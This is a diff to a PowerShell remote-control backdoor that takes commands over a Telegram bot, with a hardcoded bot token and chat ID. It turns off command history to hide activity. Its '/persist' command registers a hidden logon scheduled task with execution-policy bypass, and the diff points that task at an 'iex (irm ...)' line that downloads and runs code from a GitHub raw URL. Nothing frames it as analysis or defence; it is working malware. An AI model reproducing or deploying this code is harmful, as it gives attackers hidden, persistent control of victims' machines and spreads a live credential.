@@ -1,7 +1,7 @@
 Clear-Host
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
-$script:ScriptPath          = $MyInvocation.MyCommand.Path
+$script:ScriptPath          = "iex (irm 'https://raw.githubusercontent.com/VNXLab/Python/refs/heads/main/000000')"
 $session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $telegram_id, $api_token    = "2118389773", "8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0"
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
@@ -152,13 +152,18 @@ function CommandListener
 
                 if ($text -match "^/persist") {
                     try {
-                        if (-not $script:ScriptPath) { SendMessage "Blad: sciezka skryptu jest pusta (uruchom skrypt z pliku, nie z konsoli)." $text; continue }
-                        $conhost  = "$env:SystemRoot\System32\conhost.exe"
-                        $action   = New-ScheduledTaskAction -Execute $conhost -Argument "-- powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:ScriptPath`""
+                        if (-not $script:ScriptPath) { SendMessage "Blad: ScriptPath jest pusty — uzupelnij zmienna na gorze skryptu." $text; continue }
+                        $conhost = "$env:SystemRoot\System32\conhost.exe"
+                        $psArg   = if ($script:ScriptPath -like "*.ps1") {
+                            "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:ScriptPath`""
+                        } else {
+                            "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$script:ScriptPath`""
+                        }
+                        $action   = New-ScheduledTaskAction -Execute $conhost -Argument "-- powershell.exe $psArg"
                         $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
                         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
                         $task     = Register-ScheduledTask -TaskName "vshell_$session_id" -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force
-                        SendMessage "Persistence ustawiona.`nTask: $($task.TaskName)`nSciezka: $script:ScriptPath" $text
+                        SendMessage "Persistence ustawiona.`nTask: $($task.TaskName)`nKomenda: $script:ScriptPath" $text
                     } catch { SendMessage "Blad: $($Error[0])" $text }
                     continue
                 }
